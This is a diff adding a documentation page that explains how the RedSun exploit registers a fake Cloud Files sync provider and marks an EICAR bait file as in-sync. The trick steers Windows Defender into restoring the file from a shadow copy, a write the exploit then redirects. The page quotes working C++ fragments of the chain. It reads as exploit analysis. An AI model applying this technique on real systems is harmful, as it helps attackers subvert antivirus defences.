@@ -1,0 +1,84 @@
+---
+title: "Cloud Files API: how RedSun abuses sync placeholders"
+description: "How RedSun registers a fake cloud sync provider and creates in-sync placeholder files to trigger Windows Defender's flawed restoration logic."
+---
+
+The Windows Cloud Files API (`CldApi`) was designed to let cloud storage providers — OneDrive, Dropbox, and similar services — create lightweight placeholder files on disk that appear present but are only downloaded on demand. RedSun registers a fake sync provider to give a bait file the same placeholder attributes, tricking Windows Defender into treating detection as a restoration event rather than a removal.
+
+## What the Cloud Files API does
+
+The Cloud Files API allows a registered sync provider to:
+
+- Create placeholder files that appear to be local but are backed by cloud storage
+- Mark files as "in sync" — fully uploaded and matching their cloud copy
+- Respond to hydration requests when a file is accessed
+
+When a file is marked `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC`, the Cloud Files infrastructure considers it fully synchronized. This flag is what triggers the flawed Defender behavior: detecting such a file as malicious causes Defender to restore it from a shadow copy rather than delete it.
+
+## Registering a fake sync provider
+
+RedSun calls `CfRegisterSyncRoot` to register the working directory as a sync root with a fabricated provider identity. The provider name `"SERIOUSLYMSFT"` appears in the source alongside the comment: *"let's see how long you can play this game, I'm willing to go as far as you want."*
+
+```cpp RedSun.cpp (DoCloudStuff function)
+CF_SYNC_REGISTRATION cfreg = { 0 };
+cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
+cfreg.ProviderName = L"SERIOUSLYMSFT";
+cfreg.ProviderVersion = L"1.0";
+CF_SYNC_POLICIES syncpolicy = { 0 };
+syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
+syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
+syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
+syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
+syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
+syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
+HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy,
+    CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
+```
+
+`CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT` prevents the infrastructure from trying to populate the directory on access, which keeps the setup silent.
+
+## Connecting to the sync root
+
+After registering, `CfConnectSyncRoot` connects the process as the active sync provider for the directory. The callback registration array contains a single sentinel entry (`CF_CALLBACK_TYPE_NONE`) — no actual sync callbacks are needed, since the goal is only to tag the file, not to respond to hydration requests.
+
+```cpp RedSun.cpp
+CF_CALLBACK_REGISTRATION callbackreg[1];
+callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
+void* callbackctx = NULL;
+CF_CONNECTION_KEY cfkey = { 0 };
+hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx,
+    CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO |
+    CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
+```
+
+## Creating the placeholder
+
+`CfCreatePlaceholders` creates the tagged file. The `FileIdentity` field is set to a newly generated GUID (via `CoCreateGuid` + `StringFromGUID2`), and the file size passed in `FsMetadata` matches the size of the EICAR string that will be written.
+
+```cpp RedSun.cpp
+CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
+placeholder[0].RelativeFileName = filename;
+placeholder[0].FsMetadata = fsmetadata;
+placeholder[0].FileIdentity = wuid;
+placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
+placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE
+                     | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
+DWORD processedentries = 0;
+hs = CfCreatePlaceholders(syncroot, placeholder, 1,
+    CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
+```
+
+The two critical flags:
+
+| Flag | Effect |
+|------|--------|
+| `CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE` | Overwrites an existing file at the path if present |
+| `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC` | Marks the file as fully synchronized — the key trigger for Defender's restoration path |
+
+<Info>
+  In the execution flow, `DoCloudStuff` is called after `WaitForSingleObject(gevent, 120000)` returns — meaning Defender has already detected the EICAR file and `ShadowCopyFinderThread` has already placed its batch oplock on the VSS copy. The cloud placeholder tag is applied while the oplock is holding Defender's restoration thread, and then `SetEvent(gevent)` releases the oplock to let the exploitation chain continue.
+</Info>
+
+## Why the tag matters
+
+Without `MARK_IN_SYNC`, Defender treats the file as a normal local threat and deletes or quarantines it. With the tag, Defender's remediation logic takes the cloud restoration path: it reads the file from a Volume Shadow Copy and writes it back to the original location. This write is what RedSun intercepts and redirects.
